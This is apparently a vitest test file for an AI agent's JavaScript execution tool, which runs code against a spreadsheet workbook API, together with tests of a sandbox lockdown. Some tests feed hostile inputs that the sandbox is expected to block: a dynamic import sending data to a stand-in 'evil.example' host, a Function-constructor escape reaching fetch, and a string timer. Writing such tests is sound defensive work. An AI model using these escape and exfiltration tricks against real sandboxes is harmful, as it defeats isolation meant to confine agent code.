/// <reference types="node" />
import vm from "node:vm";
import { beforeAll, describe, expect, it } from "vitest";
import { CheckpointStore } from "../src/agent/checkpoints.js";
import { MockHost } from "../src/host/mock.js";
import { execJs, setSandboxFactory } from "../src/tools/exec_js.js";
import type { ToolContext } from "../src/tools/registry.js";
import { lockdown } from "../src/tools/sandbox/runtime.js";
import { inProcessSandbox } from "./helpers.js";

function ctxFor(host: MockHost): ToolContext {
  return { host, checkpoints: new CheckpointStore(host), ask: async () => "" };
}

beforeAll(() => setSandboxFactory(inProcessSandbox));

describe("exec_js", () => {
  it("executes code against the workbook API and captures output", async () => {
    const host = new MockHost({ Sheet1: { A1: 1, A2: 2, A3: 3 } });
    const result = await execJs.handler(
      {
        code: `
          const vals = await workbook.read("Sheet1", "A1:A3");
          const total = vals.flat().reduce((a, b) => a + b, 0);
          await workbook.write("Sheet1", "A4", [[total]]);
          console.log("total is", total);
          return total;
        `,
      },
      ctxFor(host),
    );
    expect(result).toContain("total is 6");
    expect(result).toContain("=> 6");
    expect((await host.readRange("Sheet1", "A4")).values[0][0]).toBe(6);
  });

  it("enforces the timeout", async () => {
    const host = new MockHost();
    await expect(
      execJs.handler({ code: `await new Promise((r) => setTimeout(r, 5000));`, timeoutMs: 150 }, ctxFor(host)),
    ).rejects.toThrow(/timed out/);
  });

  it("surfaces thrown errors", async () => {
    const host = new MockHost();
    await expect(execJs.handler({ code: `throw new Error("boom");` }, ctxFor(host))).rejects.toThrow(/boom/);
  });

  it("surfaces workbook API errors inside the sandbox", async () => {
    const host = new MockHost();
    const result = await execJs.handler(
      { code: `try { await workbook.read("Nope", "A1"); } catch (e) { return "caught: " + e.message; }` },
      ctxFor(host),
    );
    expect(result).toContain("caught: Sheet not found: Nope");
  });

  it("rejects dynamic import", async () => {
    const host = new MockHost();
    await expect(
      execJs.handler({ code: `await import("https://evil.example/?d=" + 1);` }, ctxFor(host)),
    ).rejects.toThrow(/may not use `import`/);
  });
});

describe("sandbox lockdown", () => {
  function lockedContext(): vm.Context {
    const ctx = vm.createContext({
      fetch: () => "leaked",
      XMLHttpRequest: function () {},
      importScripts: () => {},
      indexedDB: {},
      postMessage: () => {},
      setTimeout,
    });
    vm.runInContext(`(${lockdown.toString()})(globalThis)`, ctx);
    return ctx;
  }

  it("removes network and eval entry points", () => {
    const ctx = lockedContext();
    expect(
      vm.runInContext(
        `[typeof fetch, typeof XMLHttpRequest, typeof importScripts, typeof indexedDB, typeof postMessage, typeof eval, typeof Function]`,
        ctx,
      ),
    ).toEqual(Array(7).fill("undefined"));
  });

  it("blocks the Function-constructor escape", () => {
    const ctx = lockedContext();
    expect(
      vm.runInContext(
        `[(function(){}).constructor, (async function(){}).constructor, (function*(){}).constructor, (async function*(){}).constructor]`,
        ctx,
      ),
    ).toEqual([undefined, undefined, undefined, undefined]);
    expect(() => vm.runInContext(`(() => {}).constructor("return fetch")()`, ctx)).toThrow();
  });

  it("refuses string timers", () => {
    const ctx = lockedContext();
    expect(() => vm.runInContext(`setTimeout("fetch()", 0)`, ctx)).toThrow(/requires a function/);
  });
});
